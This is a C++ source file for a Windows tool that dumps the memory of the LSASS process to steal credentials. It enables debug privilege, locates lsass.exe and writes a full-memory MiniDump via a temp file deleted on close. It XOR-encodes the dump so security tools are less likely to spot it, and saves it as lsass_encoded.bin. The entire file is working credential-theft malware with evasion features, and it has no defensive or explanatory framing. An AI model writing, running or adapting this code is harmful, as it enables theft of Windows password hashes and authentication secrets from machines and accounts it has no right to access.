#define UNICODE
#define _UNICODE

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <psapi.h>
#include <DbgHelp.h>

#define XOR_KEY 0x41

#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Dbghelp.lib")

typedef BOOL(WINAPI* MiniDumpWriteDump_t)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
);

BOOL CALLBACK MiniDumpCallback(
    PVOID CallbackParam,
    PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    if (!CallbackOutput || !CallbackInput) 
        return true;
    
    switch (CallbackInput->CallbackType) {
        case ModuleCallback:
            if (CallbackOutput->ModuleWriteFlags & ModuleReferencedByMemory)
                CallbackOutput->ModuleWriteFlags &= ~ModuleReferencedByMemory;
            CallbackOutput->ModuleWriteFlags |= ModuleWriteModule | 
                                            ModuleWriteMiscRecord | 
                                            ModuleWriteCvRecord;
            return true;
        case ThreadCallback:
            CallbackOutput->ThreadWriteFlags = ThreadWriteThread | 
                                          ThreadWriteContext | 
                                          ThreadWriteInstructionWindow;
            return true;
        default:
            return true;
    }
}

void Log(const std::string& msg) {
    std::ofstream log("C:\\Windows\\Temp\\lsass_dumper.log", std::ios::app);
    log << msg << std::endl;
    log.close();
}


DWORD FindLSASSPid() {
    DWORD pid = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { 0 };
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(snapshot, &pe)) {
            do {
                if (_wcsicmp(pe.szExeFile, L"lsass.exe") == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(snapshot, &pe));
        }
        CloseHandle(snapshot);
    }
    return pid;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        return false;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
}

void DumpAndEncodeMemory(HANDLE hProc, std::ofstream& outFile) {
    MEMORY_BASIC_INFORMATION mbi;
    BYTE* addr = nullptr;

    while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
        if ((mbi.State == MEM_COMMIT) && (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_IMAGE)) {
            SIZE_T regionSize = mbi.RegionSize;
            BYTE* buffer = new BYTE[regionSize];

            SIZE_T bytesRead;
            if (ReadProcessMemory(hProc, mbi.BaseAddress, buffer, regionSize, &bytesRead)) {
                // XOR encode in-place
                for (SIZE_T i = 0; i < bytesRead; ++i)
                    buffer[i] ^= XOR_KEY;

                outFile.write(reinterpret_cast<char*>(buffer), bytesRead);
                std::wcout << L"[+] Dumped & encoded region at " << mbi.BaseAddress << L", size: " << bytesRead << L"\n";
            }

            delete[] buffer;
        }
        addr += mbi.RegionSize;
    }
}

void DumpAndEncodeMemoryMiniDump(HANDLE hProc, DWORD hPID, std::ofstream& outFile){
    std::vector<BYTE> outputBuffer;

    WCHAR tempPath[MAX_PATH] = {};
    WCHAR tempFileName[MAX_PATH] = {};


    // Create temp file
    if (!GetTempPathW(MAX_PATH, tempPath)) {
        CloseHandle(hProc);
        return;
    }

    if (!GetTempFileNameW(tempPath, L"LSA", 0, tempFileName)) {
        CloseHandle(hProc);
        return;
    }

    HANDLE hFile = CreateFileW(
        tempFileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hProc);
        return;
    }
    
    // load dbhhelp.dll for MiniDumpWriteDump
    HMODULE hDbgHelp = LoadLibraryW(L"dbghelp.dll");

    auto pMiniDumpWriteDump = (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");

    MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
    callbackInfo.CallbackRoutine = MiniDumpCallback;

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithThreadInfo |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithProcessThreadData |
        MiniDumpWithIndirectlyReferencedMemory
    );

    BOOL result = pMiniDumpWriteDump(
        hProc,
        hPID,
        hFile,
        dumpType,
        NULL,
        NULL,
        &callbackInfo
    );
    if (!result){
        // failed minidump
        std::cerr << "Failed to dump process. Error: " << std::hex << GetLastError();
        // cleanup
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hProc);
        return;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hProc);
        return;
    }

    outputBuffer.resize(fileSize);

    // Reset file pointer before reading it...
    if (SetFilePointer(hFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hProc);
        return;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, outputBuffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hProc);
        return;
    }

    // Sweet Victory! Let's encrypt this

    for (size_t i = 0; i < outputBuffer.size(); ++i) {
        outputBuffer[i] ^= XOR_KEY;
    }

    outFile.write(reinterpret_cast<char*>(outputBuffer.data()), bytesRead);


    FreeLibrary(hDbgHelp);
    CloseHandle(hFile);
    CloseHandle(hProc);

}

int main() {
    if (!EnableDebugPrivilege()) {
        Log("[-] Failed to enable debug privileges.");
        std::cerr << "[-] Failed to enable debug privileges.\n";
        return 1;
    }

    DWORD pid = FindLSASSPid();
    if (pid == 0) {
        Log("[-] Could not find LSASS process.");
        std::cerr << "[-] Could not find LSASS process.\n";
        return 1;
    }
    Log("[*] Attempting to open LSASS...");
    HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!hProc) {
        Log("[-] Could not open LSASS process. Run as SYSTEM.");
        std::cerr << "[-] Could not open LSASS process. Run as SYSTEM.\n";
        return 1;
    }

    std::ofstream outFile("lsass_encoded.bin", std::ios::binary);
    if (!outFile.is_open()) {
        Log("[-] Could not open output file.");
        std::cerr << "[-] Could not open output file.\n";
        CloseHandle(hProc);

        return 1;
    }
    Log("[*] LSASS process opened successfully. PID: " + std::to_string(pid));
    std::cout << "[*] Starting LSASS memory copy + XOR encoding...\n";
    // DumpAndEncodeMemory(hProc, outFile);
    DumpAndEncodeMemoryMiniDump(hProc, pid, outFile);

    outFile.close();
    CloseHandle(hProc);
    Log("[+] Dump complete. Encoded memory written to lsass_encoded.bin");
    std::cout << "[+] Dump complete. Encoded memory written to lsass_encoded.bin\n";

    return 0;
}
